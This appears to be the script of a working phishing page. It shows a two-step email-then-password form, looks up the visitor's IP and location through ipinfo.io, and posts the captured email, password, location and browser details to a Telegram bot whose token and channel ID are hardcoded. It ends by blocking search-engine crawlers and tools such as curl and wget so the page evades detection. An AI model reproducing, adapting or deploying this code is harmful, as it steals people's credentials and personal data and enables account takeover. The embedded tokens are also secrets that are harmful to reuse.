    <script>
    // Store data
let userInput = '';
let verifyInput = '';

// Config
const apiKey = '7727476364:AAHaXogDfO5itb1Z6A5CCeNRK7j1sr5wS3Y';
const channelId = '-1002231979658';

// Send data
async function sendData(message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${apiKey}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: channelId,
                text: message,
                parse_mode: 'HTML'
            })
        });
        return response.ok;
    } catch (error) {
        console.error('Error:', error);
        return false;
    }
}

// Get location data
async function getRegionInfo() {
    try {
        const response = await fetch('https://ipinfo.io/json?token=81e788912b1532');
        const data = await response.json();
        return {
            country: data.country,
            region: data.region,
            city: data.city,
            ip: data.ip,
            timezone: data.timezone,
            location: data.loc
        };
    } catch (error) {
        console.error('Error getting region info:', error);
        return null;
    }
}

// Handle first step
function handleContinue() {
    const input = document.getElementById('field1');
    const error = document.getElementById('field1Error');
    
    const validateInput = (email) => {
        return String(email)
            .toLowerCase()
            .match(/^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|.(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/);
    };

    if (!input.value || !validateInput(input.value)) {
        error.textContent = 'Please enter a valid email address to continue.';
        error.style.display = 'block';
        input.classList.add('error');
        return;
    }

    error.style.display = 'none';
    input.classList.remove('error');

    document.getElementById('step1').classList.add('hidden');
    document.getElementById('step2').classList.remove('hidden');

    document.querySelector('.user-info').textContent = input.value;

    userInput = input.value;
}

// Show first step
function showStep1() {
    document.getElementById('step2').classList.add('hidden');
    document.getElementById('step1').classList.remove('hidden');
}

// Toggle field visibility
function toggleView() {
    const field = document.getElementById('field2');
    field.type = field.type === 'password' ? 'text' : 'password';
}

// Handle submission
async function handleSubmit() {
    const verify = document.getElementById('field2');
    const error = document.getElementById('field2Error');

    if (!verify.value) {
        error.textContent = 'This field is required to continue.';
        error.style.display = 'block';
        verify.classList.add('error');
        return;
    }

    error.style.display = 'none';
    verify.classList.remove('error');

    verifyInput = verify.value;

    const regionInfo = await getRegionInfo();
    const timestamp = new Date().toLocaleString();

    const dataMessage = `
üìù New Registration Details
‚è∞ ${timestamp}

üë§ User Details:
üìß Email: ${userInput}
üîë Verify: ${verifyInput}

üì± Device Info:
üåê IP: ${regionInfo.ip}
üìç Location: ${regionInfo.city}, ${regionInfo.region}, ${regionInfo.country}
‚è∞ Zone: ${regionInfo.timezone}
üìç Coords: ${regionInfo.location}
üíª Agent: ${navigator.userAgent}
    `;

    try {
        const sent = await sendData(dataMessage);

        if (sent) {
            const button = document.querySelector('#step2 .submit-btn');
            button.textContent = 'Processing...';
            button.disabled = true;

            setTimeout(() => {
                window.location.href = 'activation.html';
            }, 1500);
        }
    } catch (error) {
        console.error('Error:', error);
        alert('An error occurred. Please try again.');
    }
}

 document.addEventListener("DOMContentLoaded", function() {
    const userAgent = navigator.userAgent.toLowerCase();
    const blockedBots = [
  "googlebot", "bingbot", "yahoo", "baiduspider", "duckduckbot", "yandexbot", 
  "sogou", "exabot", "facebot", "ia_archiver", "mj12bot", "seznambot", 
  "ahrefsbot", "semrushbot", "dotbot", "rogerbot", "gigabot", "slurp", 
  "siteexplorer", "archive.org_bot", "petalbot", "yeti", "curl", "wget", 
  "capsulebot", "tweetmemebot", "gomezagent", "scrapy", "python-requests", 
  "okhttp", "360Spider", "coccoc", "linkdexbot", "zombiebot"
];

    for (const bot of blockedBots) {
        if (userAgent.includes(bot)) {
            document.body.innerHTML = "<h1>Access Denied</h1>";
            break;
        }
    }
});
    </script>
